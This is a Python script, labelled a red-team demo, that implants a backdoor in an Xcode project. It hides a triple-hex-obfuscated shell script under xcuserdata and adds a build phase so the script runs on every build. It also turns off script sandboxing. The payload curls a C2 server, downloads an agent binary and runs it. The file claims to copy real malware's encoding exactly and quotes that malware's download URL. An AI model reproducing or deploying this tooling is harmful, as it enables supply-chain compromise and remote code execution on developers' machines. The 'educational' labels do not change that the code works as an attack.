#!/usr/bin/env python3
"""
RED TEAM DEMO - Xcode Project Implanter
=========================================
Injects a build-phase backdoor into an existing Xcode project.
This demonstrates the supply chain attack vector.

NOW WITH EXACT ORIGINAL MALWARE OBFUSCATION:
- Triple hex encoding (matching xcassets.sh from PCAP)
- Same script structure as real-world attack
- Identical execution flow: decode -> curl -> osascript

Usage:
    python3 implant_xcode_project.py --project /path/to/Project.xcodeproj --c2 http://localhost:8888
    python3 implant_xcode_project.py --project /path/to/Project.xcodeproj --cleanup

FOR EDUCATIONAL PURPOSES ONLY
"""

import argparse
import os
import re
import shutil
import sys
import uuid
from datetime import datetime
from pathlib import Path

# ============================================================================
# CONFIGURATION
# ============================================================================

IMPLANT_MARKER = "/* RED_TEAM_DEMO_IMPLANT */"
XCASSETS_DIR = ".xcassets"
PAYLOAD_SCRIPT = "xcassets.sh"

# Build phase ID (random-looking but consistent for detection)
BUILD_PHASE_ID = "A1B2C3D4E5F6G7H8I9J0K1L2"
FILE_REF_ID = "9F1A2B3C4D5E6F7A8B9C0D1E"

# Adaptix C2 Configuration
ADAPTIX_C2_HOST = "192.168.36.226"
ADAPTIX_C2_PORT = 8080
ADAPTIX_ENCRYPT_KEY = "a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6"

# ============================================================================
# OBFUSCATION - EXACT MATCH TO ORIGINAL MALWARE
# ============================================================================

def triple_hex_encode(command: str) -> str:
    """
    Triple hex encode a command - EXACT format from original malware.
    
    Original xcassets.sh decoded to: curl -fskL http://bu1knames.io/a
    
    Encoding chain:
    "curl ..." -> hex -> hex -> hex = "333637..."
    """
    result = command
    for i in range(3):
        result = result.encode('utf-8').hex()
    return result


def generate_payload_script(c2_server: str, beacon_id: str = "xcode") -> str:
    """
    Generate the malicious build script - EXACT FORMAT from original malware.
    
    Original xcassets.sh:
    #!/usr/bin/env bash
    x=$(echo '333637...' | xxd -p -r | xxd -p -r | xxd -p -r | sh )
    bash -c "$x" 
    sleep 2
    bash /tmp/.o.txt
    
    Updated to use Adaptix C2 HTTP beacon for macOS.
    """
    
    # Command to download Adaptix Gopher agent and execute it
    # This matches the original malware flow: download stager, execute it
    beacon_cmd = f'curl -fskL {c2_server}/agent.bin -o /tmp/.a && chmod +x /tmp/.a && /tmp/.a &'
    
    # Triple hex encode - EXACT same encoding as original
    encoded = triple_hex_encode(beacon_cmd)
    
    # EXACT script format from original malware
    script = f'''#!/usr/bin/env bash
x=$(echo '{encoded}' | xxd -p -r | xxd -p -r | xxd -p -r | sh )
bash -c "$x" 
'''
    return script


def generate_payload_script_verbose(c2_server: str, beacon_id: str = "xcode") -> str:
    """
    Generate verbose version with demo logging.
    Use --verbose flag to get this version.
    """
    
    # Command to download and execute Adaptix Gopher agent
    beacon_cmd = f'curl -fskL {c2_server}/agent.bin -o /tmp/.a && chmod +x /tmp/.a && /tmp/.a &'
    encoded = triple_hex_encode(beacon_cmd)
    
    script = f'''#!/usr/bin/env bash
# RED TEAM DEMO - Build Phase Implant (Verbose Mode)
# Matches original malware obfuscation with added visibility

# Demo logging (would not exist in real malware)
mkdir -p /tmp/redteam_demo
echo "[DEMO] ========================================" >> /tmp/redteam_demo/build.log
echo "[DEMO] Xcode Build Script Triggered" >> /tmp/redteam_demo/build.log
echo "[DEMO] Time: $(date)" >> /tmp/redteam_demo/build.log
echo "[DEMO] User: $(whoami)" >> /tmp/redteam_demo/build.log
echo "[DEMO] Project: $PROJECT_DIR" >> /tmp/redteam_demo/build.log
echo "[DEMO] C2 Server: {c2_server}" >> /tmp/redteam_demo/build.log
echo "[DEMO] Downloading Adaptix beacon..." >> /tmp/redteam_demo/build.log

# === ORIGINAL MALWARE CODE (exact format) ===
x=$(echo '{encoded}' | xxd -p -r | xxd -p -r | xxd -p -r | sh )
bash -c "$x" 
# === END ORIGINAL CODE ===

# Demo notification (would not exist in real malware)
osascript -e 'display notification "Adaptix beacon deployed!" with title "RED TEAM DEMO"' 2>/dev/null
echo "[DEMO] Adaptix beacon execution started" >> /tmp/redteam_demo/build.log
'''
    return script


def generate_pbxproj_additions(script_path: str) -> dict:
    """Generate the Xcode project file additions"""
    
    # Shell script build phase
    shell_script_phase = f'''
{IMPLANT_MARKER}
/* Begin PBXShellScriptBuildPhase section */
{BUILD_PHASE_ID} /* ShellScript */ = {{
    isa = PBXShellScriptBuildPhase;
    buildActionMask = 2147483647;
    files = (
    );
    inputPaths = (
    );
    outputPaths = (
    );
    runOnlyForDeploymentPostprocessing = 0;
    shellPath = /bin/sh;
    shellScript = "\\"{script_path}\\"";
}};
/* End PBXShellScriptBuildPhase section */
{IMPLANT_MARKER}
'''
    
    return {
        'shell_script_phase': shell_script_phase,
        'build_phase_id': BUILD_PHASE_ID,
    }


# ============================================================================
# IMPLANT FUNCTIONS
# ============================================================================

def find_xcodeproj(path: str) -> Path:
    """Find .xcodeproj in given path"""
    p = Path(path)
    
    if p.suffix == '.xcodeproj':
        return p
    
    # Search for .xcodeproj in directory
    for item in p.glob('*.xcodeproj'):
        return item
    
    raise FileNotFoundError(f"No .xcodeproj found in {path}")


def backup_project(xcodeproj: Path) -> Path:
    """Create backup of project file"""
    pbxproj = xcodeproj / 'project.pbxproj'
    backup = pbxproj.with_suffix('.pbxproj.backup')
    
    if not backup.exists():
        shutil.copy(pbxproj, backup)
        print(f"[+] Backup created: {backup}")
    
    return backup


def inject_payload_script(xcodeproj: Path, c2_server: str, beacon_id: str, verbose: bool = False) -> Path:
    """Inject the payload script into xcuserdata"""
    
    # Create hidden directory structure
    xcuserdata = xcodeproj / 'xcuserdata'
    xcuserdata.mkdir(exist_ok=True)
    
    hidden_dir = xcuserdata / XCASSETS_DIR
    hidden_dir.mkdir(exist_ok=True)
    
    # Write payload script (verbose version has demo logging)
    script_path = hidden_dir / PAYLOAD_SCRIPT
    if verbose:
        script_content = generate_payload_script_verbose(c2_server, beacon_id)
    else:
        script_content = generate_payload_script(c2_server, beacon_id)
    
    with open(script_path, 'w') as f:
        f.write(script_content)
    
    os.chmod(script_path, 0o755)
    
    print(f"[+] Payload script created: {script_path}")
    if verbose:
        print(f"[+] Using verbose mode (with demo logging)")
    else:
        print(f"[+] Using stealth mode (exact original malware format)")
    
    return script_path


def inject_build_phase(xcodeproj: Path, script_path: Path) -> bool:
    """Inject build phase into project.pbxproj"""
    
    pbxproj = xcodeproj / 'project.pbxproj'
    
    with open(pbxproj, 'r') as f:
        content = f.read()
    
    # Check if already implanted
    if IMPLANT_MARKER in content:
        print("[!] Project already contains implant marker")
        return False
    
    # Generate relative script path
    relative_path = f"${{PROJECT_DIR}}/{xcodeproj.name}/xcuserdata/{XCASSETS_DIR}/{PAYLOAD_SCRIPT}"
    
    additions = generate_pbxproj_additions(relative_path)
    
    # Find position to insert shell script section
    # Insert before /* Begin PBXTargetDependency section */
    insert_marker = "/* Begin PBXTargetDependency section */"
    
    if insert_marker in content:
        content = content.replace(
            insert_marker,
            additions['shell_script_phase'] + "\n" + insert_marker
        )
    else:
        # Fallback: insert before closing of objects
        content = content.replace(
            "\n\t};\n\trootObject",
            additions['shell_script_phase'] + "\n\t};\n\trootObject"
        )
    
    # Add build phase reference to native target
    # Find buildPhases array and add our phase
    build_phases_pattern = r'(buildPhases = \(\s*\n(?:\s*[A-Z0-9]+ /\* \w+ \*/,\s*\n)*)'
    
    def add_build_phase(match):
        phases = match.group(1)
        # Add our phase at the end
        return phases + f"\t\t\t\t{BUILD_PHASE_ID} /* ShellScript */,\n"
    
    content = re.sub(build_phases_pattern, add_build_phase, content, count=1)
    
    # Disable script sandboxing in Debug configuration
    content = content.replace(
        'ENABLE_USER_SCRIPT_SANDBOXING = YES;',
        'ENABLE_USER_SCRIPT_SANDBOXING = NO; /* RED_TEAM_DEMO - Disabled for payload */'
    )
    
    # Also ensure it's disabled if not present
    if 'ENABLE_USER_SCRIPT_SANDBOXING' not in content:
        # Add to Debug build settings
        content = content.replace(
            'ENABLE_TESTABILITY = YES;',
            'ENABLE_TESTABILITY = YES;\n\t\t\t\tENABLE_USER_SCRIPT_SANDBOXING = NO;'
        )
    
    # Write modified content
    with open(pbxproj, 'w') as f:
        f.write(content)
    
    print(f"[+] Build phase injected into: {pbxproj}")
    print(f"[+] Script sandboxing disabled for payload execution")
    
    return True


def cleanup_implant(xcodeproj: Path) -> bool:
    """Remove implant from project"""
    
    pbxproj = xcodeproj / 'project.pbxproj'
    
    # Restore from backup if exists
    backup = pbxproj.with_suffix('.pbxproj.backup')
    if backup.exists():
        shutil.copy(backup, pbxproj)
        print(f"[+] Restored from backup: {backup}")
    else:
        # Manual cleanup
        with open(pbxproj, 'r') as f:
            content = f.read()
        
        # Remove implant sections
        # Remove between markers
        pattern = rf'{re.escape(IMPLANT_MARKER)}.*?{re.escape(IMPLANT_MARKER)}'
        content = re.sub(pattern, '', content, flags=re.DOTALL)
        
        # Remove build phase reference
        content = re.sub(rf'\s*{BUILD_PHASE_ID} /\* ShellScript \*/,', '', content)
        
        # Restore sandboxing
        content = content.replace(
            'ENABLE_USER_SCRIPT_SANDBOXING = NO; /* RED_TEAM_DEMO - Disabled for payload */',
            'ENABLE_USER_SCRIPT_SANDBOXING = YES;'
        )
        
        with open(pbxproj, 'w') as f:
            f.write(content)
        
        print(f"[+] Implant removed from: {pbxproj}")
    
    # Remove payload script directory
    xcuserdata = xcodeproj / 'xcuserdata' / XCASSETS_DIR
    if xcuserdata.exists():
        shutil.rmtree(xcuserdata)
        print(f"[+] Removed payload directory: {xcuserdata}")
    
    return True


# ============================================================================
# MAIN
# ============================================================================

def main():
    parser = argparse.ArgumentParser(
        description='RED TEAM DEMO - Xcode Project Implanter (with realistic obfuscation)',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Examples:
    # Implant a project (stealth mode - exact original format)
    python3 implant_xcode_project.py \\
        --project ~/Projects/MyApp/MyApp.xcodeproj \\
        --c2 http://localhost:8888
    
    # Implant with verbose demo logging
    python3 implant_xcode_project.py \\
        --project ~/Projects/MyApp/MyApp.xcodeproj \\
        --c2 http://localhost:8888 \\
        --verbose
    
    # Remove implant
    python3 implant_xcode_project.py \\
        --project ~/Projects/MyApp/MyApp.xcodeproj \\
        --cleanup

What this does:
    1. Creates hidden script in .xcodeproj/xcuserdata/.xcassets/xcassets.sh
    2. Uses EXACT triple-hex encoding from original malware
    3. Adds PBXShellScriptBuildPhase to project.pbxproj
    4. Disables ENABLE_USER_SCRIPT_SANDBOXING for payload execution
    5. Script executes on every build: decode -> curl C2/a -> osascript response

Obfuscation matches original:
    curl -fskL http://C2/a -> triple hex -> '333637...' | xxd -p -r (x3) | sh
        '''
    )
    
    parser.add_argument('--project', '-p', required=True,
                       help='Path to .xcodeproj or directory containing it')
    parser.add_argument('--c2', '-c', default='http://localhost:8888',
                       help='C2 server URL (default: http://localhost:8888)')
    parser.add_argument('--beacon-id', '-b', default='xcode',
                       help='Beacon identifier (default: xcode)')
    parser.add_argument('--cleanup', action='store_true',
                       help='Remove implant and restore project')
    parser.add_argument('--no-backup', action='store_true',
                       help='Skip creating backup')
    parser.add_argument('--verbose', '-v', action='store_true',
                       help='Use verbose mode with demo logging (default: stealth/exact original)')
    
    args = parser.parse_args()
    
    print("""
    ╔══════════════════════════════════════════════════════════════╗
    ║              RED TEAM - Xcode Project Implanter              ║
    ║                                                              ║
    ║          Uses EXACT obfuscation from original malware        ║
    ║               Triple hex encoding + xxd decode               ║
    ╠══════════════════════════════════════════════════════════════╣
    ║                 FOR EDUCATIONAL USE ONLY                     ║
    ╚══════════════════════════════════════════════════════════════╝
    """)
    
    try:
        xcodeproj = find_xcodeproj(args.project)
        print(f"[*] Target project: {xcodeproj}")
        
        if args.cleanup:
            cleanup_implant(xcodeproj)
            print("\n[+] Cleanup complete!")
            return 0
        
        # Create backup
        if not args.no_backup:
            backup_project(xcodeproj)
        
        # Inject payload script
        script_path = inject_payload_script(xcodeproj, args.c2, args.beacon_id, args.verbose)
        
        # Inject build phase
        if inject_build_phase(xcodeproj, script_path):
            print("\n" + "="*60)
            print("[+] IMPLANT SUCCESSFUL!")
            print("="*60)
            print(f"    C2 Server:  {args.c2}")
            print(f"    Beacon ID:  {args.beacon_id}")
            print(f"    Script:     {script_path}")
            print(f"    Mode:       {'Verbose (demo logging)' if args.verbose else 'Stealth (exact original)'}")
            print()
            print("    Obfuscation chain:")
            print(f"    curl -fskL {args.c2}/a -> triple hex encode")
            print("    -> '333637...' | xxd -p -r | xxd -p -r | xxd -p -r | sh")
            print()
            print("    Next steps:")
            print("    1. Start C2 server: python3 c2_server.py")
            print("    2. Open project in Xcode")
            print("    3. Build the project (Cmd+B)")
            print("    4. Check C2 dashboard for beacon")
            print()
            print("    To cleanup: python3 implant_xcode_project.py --project ... --cleanup")
            print("="*60)
        else:
            print("\n[!] Implant may have failed, check project file")
            return 1
        
    except FileNotFoundError as e:
        print(f"[!] Error: {e}")
        return 1
    except Exception as e:
        print(f"[!] Unexpected error: {e}")
        import traceback
        traceback.print_exc()
        return 1
    
    return 0


if __name__ == '__main__':
    sys.exit(main())
